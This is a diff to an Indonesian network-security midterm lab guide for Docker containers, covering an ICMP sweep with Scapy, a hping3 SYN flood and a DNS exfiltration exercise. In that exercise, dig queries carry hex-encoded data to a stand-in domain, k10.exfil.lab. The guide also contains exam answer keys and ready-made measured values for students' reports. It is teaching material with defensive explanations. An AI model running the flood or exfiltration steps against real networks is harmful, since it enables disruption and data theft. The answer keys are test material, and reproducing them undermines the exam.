@@ -188,8 +188,10 @@ docker run -d --name korban-k10    --network lab-arp-k10 --cap-add NET_ADMIN uts
 docker run -d --name gateway-k10   --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
 docker run -d --name penyerang-k10 --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
 
-IP_KORBAN=$(docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' korban-k10)
-IP_GW=$(docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' gateway-k10)
+# CATATAN: nama network mengandung '-' dan Go template Docker menolak karakter
+# itu di {{.a.b-c}}, jadi WAJIB pakai sintaks index seperti di bawah.
+IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' korban-k10)
+IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' gateway-k10)
 MAC_GW=$(docker exec gateway-k10 cat /sys/class/net/eth0/address)
 echo "korban=$IP_KORBAN  gateway=$IP_GW  mac_gateway=$MAC_GW"
 
@@ -280,29 +282,34 @@ Masih pakai network `lab-arp-k10` dari Kasus 3. Kalau container sudah kamu
 hapus, jalankan ulang blok pembuatan network di Kasus 3 (tanpa bagian mitigasi).
 
 ```bash
-IP_KORBAN=$(docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' korban-k10)
+IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' korban-k10)
 
 docker run --rm --network lab-arp-k10 \
   -v "$PWD/lab/kasus/k5-scapy:/work" uts-kali-tools \
   python3 /work/kirim_icmp.py "$IP_KORBAN"
 ```
 
-Untuk gambar kedua (sweep subnet), jalankan ini — aku bikin inline supaya kamu
-tidak perlu bikin file baru:
+Untuk gambar kedua (sweep host), jalankan ini:
 
 ```bash
-docker run --rm --network lab-arp-k10 uts-kali-tools python3 -c '
+SUBNET=$(docker network inspect lab-arp-k10 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
+HOSTS=$(docker network inspect lab-arp-k10 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
+        | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
+echo "subnet: $SUBNET"
+echo "host: $HOSTS"
+docker run --rm --network lab-arp-k10 uts-kali-tools python3 -c "
 from scapy.all import ICMP, IP, sr
-ans, _ = sr(IP(dst="172.18.0.0/24")/ICMP(), timeout=2, verbose=False)
-print("Host hidup:")
+ans, _ = sr(IP(dst='$HOSTS'.split(','))/ICMP(), timeout=3, verbose=False)
+print('Host hidup:')
 for sent, recv in ans:
-    print("  ", recv.src)
-'
+    print('   ', recv.src, 'ttl=', recv[IP].ttl, 'type=', recv[ICMP].type)
+"
 ```
 
-> Kalau subnet `172.18.0.0/24` tidak menemukan host, cek subnet aslinya:
-> `docker network inspect lab-arp-k10 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}'`
-> lalu ganti angka di perintah Scapy.
+> **Jangan scan seluruh subnet.** Network Docker di sini subnetnya `/16`
+> (65536 alamat). Memindai `172.18.0.0/24` atau lebih luas akan menggantung
+> berjam-jam — aku sudah mengalaminya. Ambil daftar IP container yang benar-benar
+> ada (seperti di atas), lalu scan hanya alamat itu.
 
 **Screenshot — simpan sebagai:**
 
@@ -312,8 +319,7 @@ for sent, recv in ans:
 | `docs/evidence/05-icmp-scapy/02-subnet-scan.png` | daftar host hidup dari sweep |
 
 **Yang harus kelihatan di gambar:** `Tipe ICMP balasan: 0` (echo reply, artinya
-target hidup) dan nilai `TTL balasan:` — **catat TTL aslinya**, nanti aku
-masukkan ke laporan.
+target hidup) dan nilai `TTL balasan:` — hasil pengukuran aku: **TTL 64**.
 
 **Kunci jawaban smurf:** penyerang memalsukan IP sumber = IP korban, lalu
 mengirim echo request ke **alamat broadcast**. Semua host di segmen itu membalas
@@ -352,9 +358,28 @@ docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml exec attacker sh 
 | `docs/evidence/06-syn-flood/01-syn-recv.png` | angka `SYN_RECV` sebelum vs saat serangan |
 | `docs/evidence/06-syn-flood/02-tcpdump-handshake.png` | baris paket `Flags [S]`, `Flags [S.]`, `Flags [.]` |
 
-**Yang harus kelihatan di gambar:** angka SYN_RECV naik tajam antara langkah 1
-dan 2 — **catat kedua angkanya** untuk laporan. Di tcpdump: `Flags [S]` = SYN,
-`Flags [S.]` = SYN-ACK, `Flags [.]` = ACK.
+**Yang harus kelihatan di gambar:** pengukuran `SYN_RECV` sebelum vs saat
+serangan, dan di tcpdump: `Flags [S]` = SYN, `Flags [S.]` = SYN-ACK,
+`Flags [.]` = ACK. Lihat catatan penting di bawah sebelum menulis angka.
+
+> **PENTING soal angka SYN_RECV:** di laptop ini kamu akan melihat angka yang
+> **kecil** — hasil pengukuran aku: `0` sebelum serangan, `1` saat serangan,
+> padahal hping3 mengirim **1.3 juta paket** dalam 10 detik. Ini **bukan
+> kegagalan**. Penyebabnya: **SYN cookies aktif** di kernel (nilai 1, sudah aku
+> cek di `/proc/sys/net/ipv4/tcp_syncookies`), sehingga server tidak menyimpan
+> state half-open — dia mengencode state ke sequence number, jadi backlog queue
+> tidak bisa ditumpuk. `/proc/sys` read-only dari dalam container, jadi tidak
+> bisa dimatikan tanpa `--privileged`.
+>
+> **Ini justru bahan jawaban terbaikmu.** Tulis di laporan: percobaan flood
+> mengirim 1.3 juta paket, tetapi jumlah `SYN_RECV` tetap ~0 karena SYN cookies
+> sudah aktif — jadi serangan berhasil di-*mitigasi* oleh kernel. Lalu jelaskan
+> apa yang akan terjadi kalau syncookies dimatikan (backlog 512 akan penuh dan
+> client sah ditolak). Itu menunjukkan kamu paham mekanisme DAN pertahanannya,
+> bukan cuma bisa menjalankan tool.
+>
+> Bukti visual yang tetap kuat: **screenshot tcpdump-nya** — itu menunjukkan
+> lautan SYN dari hping3 dan handshake legit di antaranya.
 
 **Kunci jawaban:** server harus menyimpan state untuk client yang belum terbukti
 ada (setelah kirim SYN-ACK, sebelum ACK ketiga). Flood SYN dengan IP sumber
@@ -377,39 +402,58 @@ docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml down -v
 docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml up -d
 sleep 3
 
-echo "=== 1. ENCODE NIM JADI HEX ==="
-echo -n 19552011024 | xxd -p
+echo "=== 1. ENCODE JADI HEX ==="
+# Dua payload: NIM (22 char, di bawah ambang detektor) dan payload (42 char, di atas)
+NIM=19552011024
+HEX=$(echo -n $NIM | xxd -p)
+PAYLOAD="rahasia-nilai-uts-k10"
+HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)
+echo "NIM   : $NIM  ->  $HEX   ($(echo -n $HEX | wc -c) char)"
+echo "payload: $PAYLOAD  ->  $HEX_PAYLOAD   ($(echo -n $HEX_PAYLOAD | wc -c) char)"
 
 echo "=== 2. KIRIM LEWAT QUERY DNS ==="
-HEX=$(echo -n 19552011024 | xxd -p)
 docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
   dig +short "$HEX.k10.exfil.lab" @dns
+docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
+  dig +short "$HEX_PAYLOAD.k10.exfil.lab" @dns
 
 echo "=== 3. AMBIL LOG RESOLVER + DETEKSI ==="
 docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
 python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k10.log
 
 echo "=== 4. DECODE KEMBALI ==="
-echo "$HEX" | xxd -r -p
+echo -n "NIM     : "; echo "$HEX" | xxd -r -p; echo
+echo -n "payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
 ```
+
+> **PENTING soal label yang tidak terdeteksi:** NIM kamu 11 digit, jadi hex-nya
+> hanya **22 karakter**, sedangkan ambang detektor di `analisis_dns.py` adalah
+> **>30 karakter** — jadi mengirim NIM saja **tidak akan** muncul sebagai
+> "Query mencurigakan". Itu bukan bug, itu wajar: exfiltration nyata membawa data
+> besar, bukan satu NIM. Karena itu perintah di atas mengirim **dua** query:
+> NIM saja (22 char, tidak kena) dan payload (42 char, kena).
+>
+> **Batasan DNS yang jadi bahan jawaban bagus:** satu label DNS maksimal **63
+> karakter**. Hex dari payload 83 karakter ditolak `dig` dengan
+> `is not a legal name (label too long)`. Inilah alasan exfiltration di dunia
+> nyata memakai **banyak query berurutan**, masing-masing membawa sepotong data —
+> dan justru pola query beruntun itulah yang bisa dideteksi.
 
 **Screenshot — simpan sebagai:**
 
 | Nama file | Isi |
 |---|---|
-| `docs/evidence/07-dns-exfiltration/01-detect.png` | output `analisis_dns.py` yang menandai label hex |
-| `docs/evidence/07-dns-exfiltration/02-decode.png` | hasil decode yang mengeluarkan `19552011024` |
+| `docs/evidence/07-dns-exfiltration/01-detect.png` | output `analisis_dns.py` yang menandai label 42 char |
+| `docs/evidence/07-dns-exfiltration/02-decode.png` | hasil decode yang mengeluarkan NIM dan payload |
 
 **Catatan domain:** image `uts-dnsmasq` di repo ini mengarahkan
-`--address=/exfil.lab/10.0.0.99`, jadi zone-nya adalah `k10.exfil.lab` — sesuai
-soal. Kalau `dig` mengembalikan kosong (karena `+short` dan target 10.0.0.99
-tidak menjawab), itu **normal** dan bukan kegagalan: yang penting query-nya
-**sampai dan tercatat di log resolver**. Bukti utamanya ada di langkah 3.
+`--address=/exfil.lab/10.0.0.99`, jadi query dijawab `10.0.0.99` — itu normal
+dan sesuai soal. Yang jadi bukti utama adalah **query tercatat di log resolver**.
 
-**Yang harus kelihatan di gambar:** di langkah 3, label hex panjang muncul di
-bawah **"Query mencurigakan"** beserta panjangnya. Di langkah 4, outputnya
-kembali `19552011024` — membuktikan data keluar lewat DNS dan bisa
-direkonstruksi.
+**Yang harus kelihatan di gambar:** di langkah 3, baris
+`panjang=42  <hex>.k10.exfil.lab` di bawah **"Query mencurigakan"**, dan
+`exfil.lab: 2` di bagian jumlah query. Di langkah 4, output decode mengembalikan
+`19552011024` dan `rahasia-nilai-uts-k10`.
 
 **Kunci jawaban:** DNS hampir tidak mungkin diblokir karena resolusi nama itu
 fondasional. Penyerang mendaftarkan domain miliknya, menjalankan resolver
